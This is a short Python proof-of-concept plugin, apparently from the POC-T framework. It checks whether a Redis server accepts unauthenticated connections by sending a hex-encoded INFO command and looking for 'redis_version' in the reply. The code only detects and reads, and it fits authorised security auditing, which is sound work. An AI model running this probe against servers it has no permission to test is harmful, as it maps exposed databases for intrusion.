#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
redis未授权访问PoC
"""

import socket


def poc(url):
    port = int(url.split(':')[-1]) if ':' in url else 6379  # 不指定端口则为默认端口
    payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
    s = socket.socket()
    socket.setdefaulttimeout(10)
    try:
        host = url.split(':')[0]
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(1024)
        s.close()
        if recvdata and 'redis_version' in recvdata:
            return True
    except Exception:
        pass
    return False
